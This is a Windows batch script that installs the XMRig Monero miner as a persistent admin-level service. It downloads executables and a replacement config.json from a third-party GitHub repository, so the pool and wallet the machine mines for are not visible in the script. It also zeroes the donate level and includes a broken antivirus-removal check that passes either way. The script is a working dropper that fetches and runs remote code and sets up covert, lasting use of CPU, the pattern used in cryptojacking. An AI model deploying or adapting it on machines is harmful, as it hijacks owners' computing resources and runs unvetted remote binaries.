@echo off

set VERSION=1.0

REM printing greetings

echo XMRig mining setup script v%VERSION%.

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (

echo
echo [*] ERROR: You need admin access for startting this script.
pause
exit /b 1)


echo Mining in background will be performed using xmrig_miner service.

if ["%USERPROFILE%"] == [""] (
  echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "find" utility to work correctly
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "findstr" utility to work correctly
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "tasklist" utility to work correctly
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    echo ERROR: This script requires "sc" utility to work correctly
    exit /b 1
  )
)

REM calculating hashrate

set /a "EXP_MONERO_HASHRATE = %NUMBER_OF_PROCESSORS% * 700 / 1000"

if [%EXP_MONERO_HASHRATE%] == [] ( 
 echo ERROR: Can't compute projected Monero hashrate
exit 
)

REM printing intentions

set "LOGFILE=%USERPROFILE%\XMRig\xmrig.log"
echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.

echo.
echo JFYI: This host has %NUMBER_OF_PROCESSORS% CPU threads, so projected xmrig hashrate is around %EXP_MONERO_HASHRATE% KH/s.
echo.

pause

REM Start doing stuff: preparing miner

echo [*] Removing previous moneroocean miner (if any)
sc stop xmrig_miner
sc delete xmrig_miner
taskkill /f /t /im xmrig.exe

:REMOVE_DIR0
echo [*] Removing "%USERPROFILE%\XMRig" directory
timeout 5
rmdir /q /s "%USERPROFILE%\XMRig" >NUL 2>NUL
IF EXIST "%USERPROFILE%\XMRig" GOTO REMOVE_DIR0

echo [*] Looking for the latest version of Monero miner
for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"

echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
  exit /b 1
)

:REMOVE_DIR1
 echo [*] Removing "%USERPROFILE%\XMRig" directory
 timeout 5
 rmdir /q /s "%USERPROFILE%\XMRig" >NUL 2>NUL 
 IF EXIST "%USERPROFILE%\XMRig" GOTO REMOVE_DIR1

 REM echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\XMRig"
 REM powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\XMRig')"
 REM if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/Abados-tm/XMRig/main/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking advanced "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\XMRig"
  "%USERPROFILE%\7za.exe" e -y  "%USERPROFILE%\xmrig.zip" -o"%USERPROFILE%\XMRig" "xmrig.exe" "WinRing0x64.sys" "config.json" -r >NUL
  
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\XMRig"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
 )
del "%USERPROFILE%\xmrig.zip"

echo [*] Checking if stock version of "%USERPROFILE%\XMRig\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\XMRig\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\XMRig\config.json'" 
"%USERPROFILE%\XMRig\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK

:MINER_OK

echo [*] Miner "%USERPROFILE%\XMRig\xmrig.exe" is OK

for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
if [%PASS%] == [] (
  set PASS=na
)
REM if not [%EMAIL%] == [] (
REM set "PASS=%PASS%:%EMAIL%"
REM )

REM powershell -Command "$out = cat '%USERPROFILE%\XMRig\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\XMRig\config.json'" 
REM powershell -Command "$out = cat '%USERPROFILE%\XMRig\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\XMRig\config.json'" 
REM powershell -Command "$out = cat '%USERPROFILE%\XMRig\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\XMRig\config.json'" 
REM powershell -Command "$out = cat '%USERPROFILE%\XMRig\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\XMRig\config.json'" 

powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/Abados-tm/XMRig/main/config.json', '%USERPROFILE%\XMRig\config.json')"

set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat '%USERPROFILE%\XMRig\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\XMRig\config.json'" 


  


:ADMIN_MINER_SETUP

echo [*] Downloading tools to make miner service to "%USERPROFILE%\nssm.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/Abados-tm/XMRig/main/nssm.zip', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
  echo ERROR: Can't download tools to make miner service
  exit /b 1
)

echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\xmrig"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\xmrig')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/Abados-tm/XMRig/main/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\xmrig"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\xmrig" "%USERPROFILE%\nssm.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\xmrig"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\nssm.zip"

echo [*] Creating xmrig_miner service
sc stop xmrig_miner
sc delete xmrig_miner
"%USERPROFILE%\xmrig\nssm.exe" install xmrig_miner "%USERPROFILE%\xmrig\xmrig.exe"
if errorlevel 1 (
  echo ERROR: Can't create xmrig_miner service
  exit /b 1
)
"%USERPROFILE%\xmrig\nssm.exe" set xmrig_miner AppDirectory "%USERPROFILE%\xmrig"
"%USERPROFILE%\xmrig\nssm.exe" set xmrig_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%USERPROFILE%\xmrig\nssm.exe" set xmrig_miner AppStdout "%USERPROFILE%\xmrig\stdout"
"%USERPROFILE%\xmrig\nssm.exe" set xmrig_miner AppStderr "%USERPROFILE%\xmrig\stderr"

echo [*] Starting xmrig_miner service
"%USERPROFILE%\xmrig\nssm.exe" start xmrig_miner
if errorlevel 1 (
  echo ERROR: Can't start xmrig_miner service
  exit /b 1
)

echo
echo Please reboot system if xmrig_miner service is not activated yet (if "%USERPROFILE%\xmrig\xmrig.log" file is empty)
goto OK

:OK
echo
echo [*] Setup complete
pause
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b